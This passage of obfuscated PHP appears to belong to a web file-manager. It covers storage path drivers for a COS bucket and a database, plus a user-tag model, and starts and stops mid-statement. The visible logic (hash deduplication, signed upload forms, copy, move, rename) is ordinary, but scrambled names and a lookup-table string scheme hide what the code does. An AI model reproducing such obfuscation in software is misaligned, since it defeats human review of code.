$this->addAll($¢ø­ë•); $this->_childrenListSelect($À™Îˆ); } $Äî¬ùéƒ = $this->_childrenList($À™Îˆ); $Äî¬ùéƒ = array_to_keyvalue($Äî¬ùéƒ, $Ö‘™ô‹[32]); foreach ($÷í—ÁÀÜ as $ûÄ«›Âº) { $Úßîïšì = $Äî¬ùéƒ[$ûÄ«›Âº[$Ö‘™ô‹[32]]]; $ÎÒÊ = $Úßîïšì[$Ö‘™ô‹[402]]; $this->_copyApplyMeta($Úßîïšì, $•õŒºÆ¡); if ($ûÄ«›Âº[$Ö‘™ô‹[33]] == $Ö‘™ô‹[75]) { $ûÄ«›Âº[$Ö‘™ô‹[84]] = $úèÍ’­ä->getPathInner($ûÄ«›Âº[$Ö‘™ô‹[84]]); $this->_copyChildTo($úèÍ’­ä, $ûÄ«›Âº[$Ö‘™ô‹[84]], $ÎÒÊ, $¯¥ñğ¯ç, $•õŒºÆ¡, $ïÆ°³Ê…); } } } private function _addFiles($œè“ï¢, $Â¸äôï¬, $ÁùóÑı) { $ñÔ¼¦Îª =& $_SERVER[­õöî’–]; if (!$Â¸äôï¬ || count($Â¸äôï¬) == 0) { return array(); } $£Àìïú› = array(); foreach ($Â¸äôï¬ as &$¦Ç­Æîû) { Hook::trigger($ñÔ¼¦Îª[607], $¦Ç­Æîû); $¦Ç­Æîû[$ñÔ¼¦Îª[84]] = $œè“ï¢->getPathInner($¦Ç­Æîû[$ñÔ¼¦Îª[84]]); $œ£µ³–ê = $œè“ï¢->hashSimple($¦Ç­Æîû[$ñÔ¼¦Îª[84]]); $¼ªÎŠóÄ = $œè“ï¢->hashMd5($¦Ç­Æîû[$ñÔ¼¦Îª[84]]); if (strlen($¼ªÎŠóÄ) > 10 && !isset($£Àìïú›[$¼ªÎŠóÄ])) { $£Àìïú›[$¼ªÎŠóÄ] = array(); } $¦Ç­Æîû[$ñÔ¼¦Îª[177]] = $œ£µ³–ê; $¦Ç­Æîû[$ñÔ¼¦Îª[176]] = $¼ªÎŠóÄ; $£Àìïú›[$¼ªÎŠóÄ][] =& $¦Ç­Æîû; if (count($£Àìïú›[$¼ªÎŠóÄ]) > 1) { $¦Ç­Æîû[$ñÔ¼¦Îª[606]] = !0; } Hook::trigger($ñÔ¼¦Îª[608], $¦Ç­Æîû); } unset($¦Ç­Æîû); $ˆûËßë¡ = array($ñÔ¼¦Îª[176] => array($ñÔ¼¦Îª[7], array_keys($£Àìïú›))); $ñ‹Åâ¦Ç = Model($ñÔ¼¦Îª[609]); $ÂôÙ èâ = $ñ‹Åâ¦Ç->where($ˆûËßë¡)->select(); $ÂôÙ èâ = $ÂôÙ èâ ? $ÂôÙ èâ : array(); foreach ($ÂôÙ èâ as $—º©İÎ¶) { if (!isset($£Àìïú›[$—º©İÎ¶[$ñÔ¼¦Îª[176]]])) { continue; } $øÍÇÚ¬ = $£Àìïú›[$—º©İÎ¶[$ñÔ¼¦Îª[176]]]; foreach ($øÍÇÚ¬ as &$¦Ç­Æîû) { $¦Ç­Æîû[$ñÔ¼¦Îª[468]] = $—º©İÎ¶[$ñÔ¼¦Îª[468]]; $¦Ç­Æîû[$ñÔ¼¦Îª[606]] = !0; } unset($¦Ç­Æîû); } $øóƒİ = array(); foreach ($Â¸äôï¬ as $÷¾¼Ÿ·”) { Hook::trigger($ñÔ¼¦Îª[610], $÷¾¼Ÿ·”); if (isset($÷¾¼Ÿ·”[$ñÔ¼¦Îª[606]]) && $÷¾¼Ÿ·”[$ñÔ¼¦Îª[606]]) { Hook::trigger($ñÔ¼¦Îª[611], $÷¾¼Ÿ·”); continue; } $ÅÀ¿óÖÉ = $œè“ï¢->getPathInner($÷¾¼Ÿ·”[$ñÔ¼¦Îª[84]]); $›€ÁİŞ© = $ñ‹Åâ¦Ç->addFileMake($ÅÀ¿óÖÉ, $÷¾¼Ÿ·”[$ñÔ¼¦Îª[76]], $÷¾¼Ÿ·”[$ñÔ¼¦Îª[177]], $÷¾¼Ÿ·”[$ñÔ¼¦Îª[176]], $÷¾¼Ÿ·”[$ñÔ¼¦Îª[32]], $ÁùóÑı); Hook::trigger($ñÔ¼¦Îª[611], $÷¾¼Ÿ·”); if (!is_array($›€ÁİŞ©)) { continue; } $øóƒİ[] = $›€ÁİŞ©; } $ñ‹Åâ¦Ç->addAll($øóƒİ); $ˆûËßë¡ = array($ñÔ¼¦Îª[176] => array($ñÔ¼¦Îª[7], array_keys($£Àìïú›))); $ÂôÙ èâ = $ñ‹Åâ¦Ç->where($ˆûËßë¡)->select(); $ÂôÙ èâ = $ÂôÙ èâ ? $ÂôÙ èâ : array(); foreach ($ÂôÙ èâ as $—º©İÎ¶) { if (!isset($£Àìïú›[$—º©İÎ¶[$ñÔ¼¦Îª[176]]])) { continue; } $Ç–ö„õ˜ =& $£Àìïú›[$—º©İÎ¶[$ñÔ¼¦Îª[176]]]; foreach ($Ç–ö„õ˜ as &$¦Ç­Æîû) { $¦Ç­Æîû[$ñÔ¼¦Îª[468]] = $—º©İÎ¶[$ñÔ¼¦Îª[468]]; } unset($¦Ç­Æîû); } $Œ£ÏÖÊå = array(); foreach ($Â¸äôï¬ as $Ïë×²¨²) { $Œ£ÏÖÊå[$Ïë×²¨²[$ñÔ¼¦Îª[32]]] = $Ïë×²¨²; } return $Œ£ÏÖÊå; } } goto e¸Îñ°™«°; F·ÜÜÍÊÄ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ü­ºÉ¥á) { parent::__construct($ü­ºÉ¥á); $this->signatureVersion($_SERVER[­õöî’–][216]); } public function uploadFormData($Ä¦´õÃ, $şª„±’‘ = 3600) { $Îòú·Ÿ‚ =& $_SERVER[­õöî’–]; $®ıƒÏò¥ = $Îòú·Ÿ‚[198]; $ãåşğÎÍ = $Îòú·Ÿ‚[232]; $—éõÆê“ = $Îòú·Ÿ‚[1317]; $’®¨¦´‘ = gmdate($Îòú·Ÿ‚[1318], time() + $şª„±’‘); $ÚÔëÛ†Ú = (string) time() . $Îòú·Ÿ‚[71] . (string) (time() + $şª„±’‘); $îé±Ê¼¤ = array($Îòú·Ÿ‚[1319] => $’®¨¦´‘, $Îòú·Ÿ‚[1320] => array(array($Îòú·Ÿ‚[1321] => $®ıƒÏò¥), array($Îòú·Ÿ‚[1322] => $this->bucket), array($Îòú·Ÿ‚[1323], $Îòú·Ÿ‚[1324], $Îòú·Ÿ‚[12]), array($Îòú·Ÿ‚[1325] => $—éõÆê“), array($Îòú·Ÿ‚[1326] => $ãåşğÎÍ), array($Îòú·Ÿ‚[1327] => $this->accessKey), array($Îòú·Ÿ‚[1328] => $ÚÔëÛ†Ú))); $îé±Ê¼¤ = json_encode($îé±Ê¼¤); $†ÀéÅé¸ = hash_hmac($Îòú·Ÿ‚[232], $ÚÔëÛ†Ú, $this->secret); $ßõÉìÃ• = sha1($îé±Ê¼¤); $¯ªÑÅæÊ = hash_hmac($Îòú·Ÿ‚[232], $ßõÉìÃ•, $†ÀéÅé¸); $À¶ûõ×× = array($Îòú·Ÿ‚[1321] => $®ıƒÏò¥, $Îòú·Ÿ‚[1325] => $—éõÆê“, $Îòú·Ÿ‚[1329] => base64_encode($îé±Ê¼¤), $Îòú·Ÿ‚[1326] => $ãåşğÎÍ, $Îòú·Ÿ‚[1327] => $this->accessKey, $Îòú·Ÿ‚[1330] => $ÚÔëÛ†Ú, $Îòú·Ÿ‚[1331] => $¯ªÑÅæÊ, $Îòú·Ÿ‚[181] => $this->getHost()); return $À¶ûõ××; } public function fileOutLink($´¦ÔŸ²‡) { $¼¾¯Óİ =& $_SERVER[­õöî’–]; if (substr($´¦ÔŸ²‡, 0, 7) == $¼¾¯Óİ[1332]) { $´¦ÔŸ²‡ = $¼¾¯Óİ[1333] . substr($´¦ÔŸ²‡, 7); } header($¼¾¯Óİ[161] . $´¦ÔŸ²‡); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($¡Šò¹§Ø) { $this->pathParse = $¡Šò¹§Ø; $this->model = Model($_SERVER[­õöî’–][1334]); } public function getPath($Ò©Ûã) { return trim($Ò©Ûã, $_SERVER[­õöî’–][8]); } public function pathFather($ÑÄ«ĞñÌ) { $Ä˜Êõ›ñ = $this->parse($ÑÄ«ĞñÌ); $Ä˜Êõ›ñ = $this->infoSimple($ÑÄ«ĞñÌ); return $Ä˜Êõ›ñ ? $Ä˜Êõ›ñ[$_SERVER[­õöî’–][432]] : !1; } public function pathThis($ûÚâíå¤) { $†û¬‡î = $this->infoSimple($ûÚâíå¤); return $†û¬‡î ? $†û¬‡î[$_SERVER[­õöî’–][32]] : !1; } public function getPathOuter($æ¨êÒ´Å) { if (!$æ¨êÒ´Å) { return $æ¨êÒ´Å; } $™ÀÍÊæ˜ = $this->parse($æ¨êÒ´Å); return KodIO::make($™ÀÍÊæ˜[$_SERVER[­õöî’–][399]]); } public function copyFolderFromIO($šåÑåÎ†, $İƒ¼’â§, $÷ôßªÂô, $•ªŸß­, $·Ğ¤¨ˆÈ) { $¸ø• = $this->model->copyFolderFromIO($šåÑåÎ†, $İƒ¼’â§, $÷ôßªÂô, $•ªŸß­, $·Ğ¤¨ˆÈ); return KodIO::make($¸ø•); } public function isParentOf($„³÷‚×, $ú”•ÌÔœ) { return $this->model->isParentOf($„³÷‚×, $ú”•ÌÔœ); } public function mkfile($²ÒÒ”Â³, $Äİ»Í‘ = '', $«˜ÏŒ« = REPEAT_RENAME) { $˜ÜïÕ‹ =& $_SERVER[­õöî’–]; $ÊñÁÌäó = $this->parse($²ÒÒ”Â³); $²ÒÒ”Â³ = $ÊñÁÌäó[$˜ÜïÕ‹[399]]; for ($î¡¹ãË¼ = 0; $î¡¹ãË¼ < count($ÊñÁÌäó[$˜ÜïÕ‹[1335]]); $î¡¹ãË¼++) { $ÉÕğªˆà = $ÊñÁÌäó[$˜ÜïÕ‹[1335]][$î¡¹ãË¼]; if ($î¡¹ãË¼ == count($ÊñÁÌäó[$˜ÜïÕ‹[1335]]) - 1) { $²ÒÒ”Â³ = $this->model->mkfile($²ÒÒ”Â³, $ÉÕğªˆà, $Äİ»Í‘, $«˜ÏŒ«); break; } $²ÒÒ”Â³ = $this->model->mkdir($²ÒÒ”Â³, $ÉÕğªˆà, REPEAT_SKIP); } return $this->getPathOuter($²ÒÒ”Â³); } public function mkdir($¹’ÄãÃş, $ÎÅ¸›Ş = REPEAT_SKIP) { $³è‡‘â­ =& $_SERVER[­õöî’–]; $Êóñ»Ûµ = $this->parse($¹’ÄãÃş); $¹’ÄãÃş = $Êóñ»Ûµ[$³è‡‘â­[399]]; for ($íŒÃ¼Œ = 0; $íŒÃ¼Œ < count($Êóñ»Ûµ[$³è‡‘â­[1335]]); $íŒÃ¼Œ++) { $•ÄõÛ©² = $Êóñ»Ûµ[$³è‡‘â­[1335]][$íŒÃ¼Œ]; $¹’ÄãÃş = $this->model->mkdir($¹’ÄãÃş, $•ÄõÛ©², $ÎÅ¸›Ş); } return $this->getPathOuter($¹’ÄãÃş); } public function copyFile($™²øú©œ, $üŒ˜ÙÈÊ, $í¸òĞÒÁ = REPEAT_REPLACE) { $¬ÏÄö¿Ö =& $_SERVER[­õöî’–]; $êı¹Üö¤ = $this->parse($üŒ˜ÙÈÊ); $ğÒ´ßÕ× = $this->model->copy($™²øú©œ, $êı¹Üö¤[$¬ÏÄö¿Ö[399]], $í¸òĞÒÁ, $êı¹Üö¤[$¬ÏÄö¿Ö[84]]); return $ğÒ´ßÕ× ? $this->getPathOuter($ğÒ´ßÕ×) : !1; } public function moveFile($Åì›Ğ‹İ, $‰ÛŒ³«£, $´ÀİéÁÅ = REPEAT_REPLACE) { $ÁäñåÌ =& $_SERVER[­õöî’–]; $òƒÈãåú = $this->parse($‰ÛŒ³«£); $Íİ–óÜ = $this->model->move($Åì›Ğ‹İ, $òƒÈãåú[$ÁäñåÌ[399]], $´ÀİéÁÅ, $òƒÈãåú[$ÁäñåÌ[84]]); return $Íİ–óÜ ? $this->getPathOuter($Íİ–óÜ) : !1; } public function copy($ú±†ë¼, $‘–¡¸Ö¨, $Í‰ª—ç = REPEAT_REPLACE, $ĞÓå˜À¼ = false) { $¿¬©İ¢÷ = $this->parse($‘–¡¸Ö¨); $×åğÀ§Ê = $this->model->copy($ú±†ë¼, $¿¬©İ¢÷[$_SERVER[­õöî’–][399]], $Í‰ª—ç, $ĞÓå˜À¼); return $×åğÀ§Ê ? $this->getPathOuter($×åğÀ§Ê) : !1; } public function moveSameAllow() { } public function move($ùúÉƒ­Ë, $ûñ·Şï†, $Êúâç³® = REPEAT_REPLACE, $£Ø•×Úô = false) { $£ÂÆÉ‡Å = $this->parse($ûñ·Şï†); $°¸Êìƒ = $this->model->move($ùúÉƒ­Ë, $£ÂÆÉ‡Å[$_SERVER[­õöî’–][399]], $Êúâç³®, $£Ø•×Úô); return $°¸Êìƒ ? $this->getPathOuter($°¸Êìƒ) : !1; } public function remove($¥˜ÑàËŸ, $Œ£óÑíâ = true) { return $this->model->remove($¥˜ÑàËŸ, $Œ£óÑíâ); } public function rename($ù­äÆ¿, $ÜŞèÑ) { $¼óº½µ = $this->model->rename($ù­äÆ¿, $ÜŞèÑ); return $¼óº½µ ? $this->getPathOuter($ù­äÆ¿) : $¼óº½µ; } public function size($à©î†·–) { $—ôüÕ± = $this->infoSimple($à©î†·–); return $—ôüÕ± ? $—ôüÕ±[$_SERVER[­õöî’–][76]] : 0; } public function infoSimple($ŠÆğÚ»Ø) { return $this->model->sourceInfo($ŠÆğÚ»Ø); } public function info($‚Ñ€î•“) { return $this->infoParse($‚Ñ€î•“); } public function infoAuth($³Ì¥˜ëÀ) { return $this->infoParse($³Ì¥˜ëÀ, !1, !0); } public function infoWithChildren($»Ááˆ¦Ò) { return $this->infoParse($»Ááˆ¦Ò, !0); } protected function infoParse($ĞÑ’•ı, $É†ßóº = false, $÷“”ñŸ = false) { if (!$É†ßóº) { return $this->model->pathInfo($ĞÑ’•ı, $÷“”ñŸ); } return $this->model->pathInfoMore($ĞÑ’•ı); } public function infoFull($ªĞ¡Ìñ½) { $Ì‹÷„½½ =& $_SERVER[­õöî’–]; $¢õ®Ö¬ò = explode($Ì‹÷„½½[8], $ªĞ¡Ìñ½); $û¿øÏ†ã = implode($Ì‹÷„½½[8], array_splice($¢õ®Ö¬ò, 1)); return $this->model->pathInfoByPath($¢õ®Ö¬ò[0], $û¿øÏ†ã); } public function hashSimple($ı¹­Š‡) { $¸³È‘º =& $_SERVER[­õöî’–]; $¶ÀúĞøÑ = $this->infoWithChildren($ı¹­Š‡); return $¶ÀúĞøÑ[$¸³È‘º[170]][$¸³È‘º[177]]; } public function hashMd5($·²ûÏÚ) { $¨¹Ç» =& $_SERVER[­õöî’–]; $Ïî‰”ß = $this->infoWithChildren($·²ûÏÚ); return $Ïî‰”ß[$¨¹Ç»[170]][$¨¹Ç»[176]]; } public function exist($áïîÑÑö) { $Øä·ÔÓŠ =& $_SERVER[­õöî’–]; $­ÍôÊ€¦ = $this->parse($áïîÑÑö); if (!$­ÍôÊ€¦[$Øä·ÔÓŠ[84]]) { return $this->isFile($áïîÑÑö) || $this->isFolder($áïîÑÑö); } $œÇÂÜÀ = array($Øä·ÔÓŠ[401] => $­ÍôÊ€¦[$Øä·ÔÓŠ[399]], $Øä·ÔÓŠ[32] => $­ÍôÊ€¦[$Øä·ÔÓŠ[84]]); $ÈÚã½óÃ = $this->model->where($œÇÂÜÀ)->find(); return $ÈÚã½óÃ ? !0 : !1; } public function isFile($Õ´‘‚Ï¾) { $ğÂü‚à =& $_SERVER[­õöî’–]; $ıâœãÃ = $this->infoSimple($Õ´‘‚Ï¾); return $ıâœãÃ && $ıâœãÃ[$ğÂü‚à[410]] == $ğÂü‚à[88] ? !1 : !0; } public function isFolder($ÜÂ³Ô¿–) { $ĞŞ¨öô¬ =& $_SERVER[­õöî’–]; $â¬Í¬°Ì = $this->infoSimple($ÜÂ³Ô¿–); return $â¬Í¬°Ì && $â¬Í¬°Ì[$ĞŞ¨öô¬[410]] == $ĞŞ¨öô¬[88] ? !0 : !1; } public function listPath($èîÅƒı´, $’î­“ = false) { $ÚŞÌ¬„ü =& $_SERVER[­õöî’–]; if ($èîÅƒı´ == $ÚŞÌ¬„ü[12]) { return !1; } $¿¢Ñ°›» = array($ÚŞÌ¬„ü[401] => $èîÅƒı´); if ($’î­“) { return $this->model->listSource($¿¢Ñ°›», -1); } return $this->model->listSource($¿¢Ñ°›»); } public function has($½ˆÅ½Î, $ŸÉ‹ºù = false, $šÃòÎ® = null) { $åñŒ“Á =& $_SERVER[­õöî’–]; $ï‘ßàÚÛ = $this->infoWithChildren($½ˆÅ½Î); if ($ŸÉ‹ºù) { return array($åñŒ“Á[208] => $ï‘ßàÚÛ[$åñŒ“Á[208]], $åñŒ“Á[207] => $ï‘ßàÚÛ[$åñŒ“Á[207]]); } return $šÃòÎ® ? $ï‘ßàÚÛ[$åñŒ“Á[208]] : $ï‘ßàÚÛ[$åñŒ“Á[207]]; } public function listAll($É¥È³ß‘) { $ô´¸‘ª = IO::info($this->pathParse[$_SERVER[­õöî’–][84]]); if (!$ô´¸‘ª) { return array(); } return $this->model->listAll($É¥È³ß‘); } public function getContent($×‚‡•) { return $this->model->getContent($×‚‡•); } public function setContent($Ş«ÀùÓ, $íš¯«ó© = '') { return $this->model->setContent($Ş«ÀùÓ, $íš¯«ó©); } public function fileSubstr($ÏèÜöÅá, $»˜æ£§, $ä”„×¿¼) { return $this->model->fileSubstr($ÏèÜöÅá, $»˜æ£§, $ä”„×¿¼); } public function download($è±µ„¿€, $ÍºÕœ¾ = '') { $£®ÑÛá· = get_path_father($ÍºÕœ¾); $È‰÷„ğ = get_path_this($ÍºÕœ¾); $±«ì°†Â = $this->model->fileInfoGet($è±µ„¿€); $è•„Ğß = IO::copy($±«ì°†Â[$_SERVER[­õöî’–][84]], $£®ÑÛá·, !1, $È‰÷„ğ); return $è•„Ğß; } public function setModifyTime($¾şšÓµõ, $õÉª¢ = '') { $‹…„ÅÄñ =& $_SERVER[­õöî’–]; if (!$¾şšÓµõ) { return; } $this->model->where(array($‹…„ÅÄñ[417] => $¾şšÓµõ))->save(array($‹…„ÅÄñ[85] => $õÉª¢)); } public function upload($Æßéªöî, $ÏæÆæê², $©¾Â•ğœ = false, $Ö«·ÒÔÁ = REPEAT_REPLACE) { $ÌÎµÒ×š =& $_SERVER[­õöî’–]; $¿î¯Ã ˆ = $this->parse($Æßéªöî); $­œÛ»Á€ = $this->model->addFile($¿î¯Ã ˆ[$ÌÎµÒ×š[399]], $ÏæÆæê², $¿î¯Ã ˆ[$ÌÎµÒ×š[84]], $©¾Â•ğœ, $Ö«·ÒÔÁ); return $this->getPathOuter($­œÛ»Á€); } public function uploadFileByID($§¬¢ßÛÒ, $ƒëâÕ‹í, $µÜãçå¾) { $³²ˆ¼ä =& $_SERVER[­õöî’–]; $½»«Äğ¥ = $this->parse($§¬¢ßÛÒ); $•Ìëòçİ = $this->model->addFileByFileID($½»«Äğ¥[$³²ˆ¼ä[399]], $ƒëâÕ‹í, $½»«Äğ¥[$³²ˆ¼ä[84]], $µÜãçå¾); return $this->getPathOuter($•Ìëòçİ); } public function addFileByRemote($Áä­Å¿Ÿ, $ø¼ğªù, $°æÑë¥ = array(), $üÜÀ©“Ü = '', $ÓÍÊÎ‚Ñ) { $“İ–îÀ© =& $_SERVER[­õöî’–]; $¼Í§Ú©Ê = $this->parse($Áä­Å¿Ÿ); $üÜÀ©“Ü = empty($üÜÀ©“Ü) ? $¼Í§Ú©Ê[$“İ–îÀ©[84]] : $üÜÀ©“Ü; $ÏÀ™ÔŞ’ = $this->model->addFileByRemote($¼Í§Ú©Ê[$“İ–îÀ©[399]], $ø¼ğªù, $üÜÀ©“Ü, $°æÑë¥, $ÓÍÊÎ‚Ñ); return $this->getPathOuter($ÏÀ™ÔŞ’); } public function uploadLink($®…·ĞÈ“, $á¡«ÔÌ = 0) { $ˆ¸×¦„ =& $_SERVER[­õöî’–]; $Œ‰Â“šÂ = $this->parse($®…·ĞÈ“); $÷ı¶şíâ = _get($GLOBALS[$ˆ¸×¦„[7]], $ˆ¸×¦„[1336]); $Îúšê»• = _get($GLOBALS[$ˆ¸×¦„[7]], $ˆ¸×¦„[1337]); $®…·ĞÈ“ = Model($ˆ¸×¦„[609])->createFileName($Œ‰Â“šÂ[$ˆ¸×¦„[84]], $÷ı¶şíâ, $Îúšê»•); return IO::uploadLink($®…·ĞÈ“, $á¡«ÔÌ); } public function fileNameAuto($Ÿ÷˜—ÙŒ, $ƒÌŒëÍÉ, $‹ñÒü À = REPEAT_REPLACE, $éŞÆõÕ = false) { return $this->model->fileNameAuto($Ÿ÷˜—ÙŒ, $ƒÌŒëÍÉ, $‹ñÒü À, $éŞÆõÕ); } public function fileNameExist($×¬µïù¯, $¦ğêŠ½º) { return $this->model->fileNameExist($×¬µïù¯, $¦ğêŠ½º); } protected function _fileOut($”Õ¾êŠ, $™äÌÈğ = false, $´¶‰½ï = false, $¢½ğ±Ôî = '', $·´‘¼  = false) { $½úœáÕ =& $_SERVER[­õöî’–]; $šç—¸Äô = $this->model->sourceInfo($”Õ¾êŠ); if ($šç—¸Äô[$½úœáÕ[410]] == $½úœáÕ[88]) { header($½úœáÕ[1338]); die; } $ıêÖ²Àš = $this->model->fileInfoGet($”Õ¾êŠ); $¢½ğ±Ôî = $ıêÖ²Àš[$½úœáÕ[176]] ? $ıêÖ²Àš[$½úœáÕ[176]] : $¢½ğ±Ôî; $ş¦°ñİ¥ = isset($GLOBALS[$½úœáÕ[1339]]) ? $GLOBALS[$½úœáÕ[1339]] : $šç—¸Äô[$½úœáÕ[32]]; if ($·´‘¼ ) { return IO::fileOutServer($ıêÖ²Àš[$½úœáÕ[84]], $™äÌÈğ, $ş¦°ñİ¥, $¢½ğ±Ôî); } IO::fileOut($ıêÖ²Àš[$½úœáÕ[84]], $™äÌÈğ, $ş¦°ñİ¥, $¢½ğ±Ôî); } public function fileOut($£Óş†Ò¢, $àøÌ±èü = false, $Ôìù•’ = false, $Ó½şÈæš = '') { $this->_fileOut($£Óş†Ò¢, $àøÌ±èü, $Ôìù•’, $Ó½şÈæš); } public function fileOutServer($†äšıÀœ, $½¨›Îñ­ = false, $şî†Øğì = false, $ğÕ¶ô¡Š = '') { $this->_fileOut($†äšıÀœ, $½¨›Îñ­, $şî†Øğì, $ğÕ¶ô¡Š, !0); } protected function _fileOutImage($¢¦ø»ÉË, $Ë¨àŸÒñ = 250) { $ñ°ùå =& $_SERVER[­õöî’–]; $»Âï°Òæ = $this->model->pathInfo($¢¦ø»ÉË); if ($»Âï°Òæ[$ñ°ùå[410]] == $ñ°ùå[88]) { show_json($ñ°ùå[1340] . $¢¦ø»ÉË, !1); } $·Ï•¹ÃĞ = $this->model->fileInfoGet($¢¦ø»ÉË); $·Ï•¹ÃĞ[$ñ°ùå[32]] = $»Âï°Òæ[$ñ°ùå[32]]; $·Ï•¹ÃĞ[$ñ°ùå[169]] = $»Âï°Òæ[$ñ°ùå[169]]; $GLOBALS[$ñ°ùå[1339]] = $·Ï•¹ÃĞ[$ñ°ùå[32]]; $GLOBALS[$ñ°ùå[168]] = $·Ï•¹ÃĞ; IO::fileOutImage($·Ï•¹ÃĞ[$ñ°ùå[84]], $Ë¨àŸÒñ); } public function fileOutImage($À‘µƒ¯‘, $•ÊÙÓ¼ı = 250) { $this->_fileOutImage($À‘µƒ¯‘, $•ÊÙÓ¼ı); } public function fileOutImageServer($°ÀªçØØ, $˜¼äÛ€© = 250) { $this->_fileOutImage($°ÀªçØØ, $˜¼äÛ€©); } public function link($Í‘öºéî, $ÀÂç˜™­ = '') { $¥Öˆ‹‰ı = $this->model->fileInfoGet($Í‘öºéî); return IO::link($¥Öˆ‹‰ı[$_SERVER[­õöî’–][84]], $ÀÂç˜™­); } protected function parse($Ê©³˜ù›) { $„¸áÆ™ =& $_SERVER[­õöî’–]; if (strstr($Ê©³˜ù›, $„¸áÆ™[8]) === !1) { return array($„¸áÆ™[419] => intval($Ê©³˜ù›), $„¸áÆ™[84] => $„¸áÆ™[12], $„¸áÆ™[1335] => array()); } $´‚ƒšã = explode($„¸áÆ™[8], trim($Ê©³˜ù›, $„¸áÆ™[8])); if (count($´‚ƒšã) < 2) { show_tips(clear_html($Ê©³˜ù›) . $„¸áÆ™[1341]); } return array($„¸áÆ™[419] => intval($´‚ƒšã[0]), $„¸áÆ™[84] => $´‚ƒšã[1], $„¸áÆ™[1335] => array_slice($´‚ƒšã, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($Œ¸µ€Åş) { $this->pathParse = $Œ¸µ€Åş; $this->model = Model($_SERVER[­õöî’–][1334]); } public function getPathOuter($ó•³¸˜›) { $¸ÕïÔ =& $_SERVER[­õöî’–]; if (!$ó•³¸˜›) { return $ó•³¸˜›; } $Ù±ı¹ = $this->parse($ó•³¸˜›); return trim(KodIO::makeShare($this->pathParse[$¸ÕïÔ[399]], $Ù±ı¹[$¸ÕïÔ[399]]), $¸ÕïÔ[8]); } protected function infoParse($‹Â™•ù•, $ÒÕÎ¯ğµ = false, $ŸŠ¦›Òò = false) { $äëç™š =& $_SERVER[­õöî’–]; $„»œÒé» = $this->pathParse[$äëç™š[399]]; $Ã¦º¹’Ï = trim($this->pathParse[$äëç™š[1167]], $äëç™š[8]); return Action($äëç™š[1342])->sharePathInfo($„»œÒé», $Ã¦º¹’Ï, $ÒÕÎ¯ğµ); } public function infoFull($œ†™ñ‰•) { $ì©ö ²á =& $_SERVER[­õöî’–]; $—»·•…ñ = explode($ì©ö ²á[8], trim($œ†™ñ‰•, $ì©ö ²á[8])); if (count($—»·•…ñ) > 1) { $¤Õî½¨” = implode($ì©ö ²á[8], array_splice($—»·•…ñ, 1)); $óÕ¥“Çà = $this->model->pathInfoByPath($—»·•…ñ[0], $¤Õî½¨”); if (!$óÕ¥“Çà) { return !1; } $this->pathParse[$ì©ö ²á[1167]] = $óÕ¥“Çà[$ì©ö ²á[402]]; } return $this->infoParse($œ†™ñ‰•); } public function listAll($Û¥°Î’á) { $ú××¯ˆÀ =& $_SERVER[­õöî’–]; $ÊœôÕ‹ = IO::info($this->pathParse[$ú××¯ˆÀ[84]]); if (!$ÊœôÕ‹) { return array(); } $æÓŠÏ¡ = $this->model->listAll($Û¥°Î’á); $°–Èá¹É = Model($ú××¯ˆÀ[601])->getInfo($ÊœôÕ‹[$ú××¯ˆÀ[489]]); $å©æİÍÙ = Action($ú××¯ˆÀ[1342]); foreach ($æÓŠÏ¡ as &$íî×ÎüÕ) { check_abort(); $íî×ÎüÕ[$ú××¯ˆÀ[86]] = $å©æİÍÙ->_shareItemeParse($íî×ÎüÕ[$ú××¯ˆÀ[86]], $°–Èá¹É); } unset($íî×ÎüÕ); return $æÓŠÏ¡; } } goto c›ô‹Ö¸…˜; dßÌìÇÌ´…: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\164\x61\147\114\151\163\x74"; public $modelType = "\125\x73\145\162\117\160\164\151\157\156"; public $field = array("\x6e\x61\x6d\145", "\163\164\x79\154\145", "\163\x6f\x72\x74"); public function listData($²µŞæË‘ = false, $ÄÜ“×§ï = "\x73\157\x72\164", $¦ÃŒ‚°ˆ = false) { return parent::listData($²µŞæË‘, $ÄÜ“×§ï, $¦ÃŒ‚°ˆ); } public function remove($Ä›ÕÖÑÌ) { return parent::remove($Ä›ÕÖÑÌ); } public function add($‡µ»‹¨, $‡ƒíØş = "\x6c\x61\142\x65\154\55\x67\x72\x65\x79\x2d\x6e\x6f\x72\155\x61\154") { $®ê±Â¹Œ =& $_SERVER[­õöî’–]; if ($this->findByName($‡µ»‹¨)) { return !1; } $ÃªÛ±½ó = array($®ê±Â¹Œ[420] => $‡µ»‹¨, $®ê±Â¹Œ[485] => $‡ƒíØş, $®ê±Â¹Œ[1853] => $this->getSort($®ê±Â¹Œ[258]) + 1); return parent::insert($ÃªÛ±½ó); } public function update($è•´‡Ö—, $Ÿ¬”…Š™) { $ÔåíÊ½ =& $_SERVER[­õöî’–]; $ä‘— = $this->listData($è•´‡Ö—); $§µßíøã = $this->findByName($Ÿ¬”…Š™[$ÔåíÊ½[32]]); if (!$ä‘— || $§µßíøã && $§µßíøã[$ÔåíÊ½[399]] != $ä‘—[$ÔåíÊ½[399]]) { return !1; } return parent::update($è•´‡Ö—, $Ÿ¬”…Š™); } public function moveTop($¨Ó—™äø) { $©î†üèú =& $_SERVER[­õöî’–]; $£³”Ìà = parent::listData(); $Ñ£şşÉÇ = $this->getSort($©î†üèú[257]); foreach ($£³”Ìà as &$È°§Îû) { if ($È°§Îû[$©î†üèú[399]] == $¨Ó—™äø) { $È°§Îû[$©î†üèú[1873]] = $Ñ£şşÉÇ; continue; } $È°§Îû[$©î†üèú[1873]] += 1; } unset($È°§Îû); return parent::resetData($£³”Ìà); } public function moveBottom($äÉäÙŒ·) { $İ©®¶Ê =& $_SERVER[­õöî’–]; $ÀÁºØªÉ = $this->getSort($İ©®¶Ê[258]) + 1; return parent::update($äÉäÙŒ·, array($İ©®¶Ê[1873] => $ÀÁºØªÉ)); } public function resetSort($ŒªîÕëó) { $ÄÏÇ•‹ =& $_SERVER[­õöî’–]; $úË¸ƒ“Œ = array(); $ŒªîÕëó = is_array($ŒªîÕëó) ? $ŒªîÕëó : array(); for ($’ÎÌÀ = 0; $’ÎÌÀ < count($ŒªîÕëó); $’ÎÌÀ++) { $úË¸ƒ“Œ[$ŒªîÕëó[$’ÎÌÀ] . $ÄÏÇ•‹[12]] = $’ÎÌÀ + 1; } $«†û¹» = parent::listData(); foreach ($«†û¹» as &$—ƒš±¯) { $“  Ò‹ = 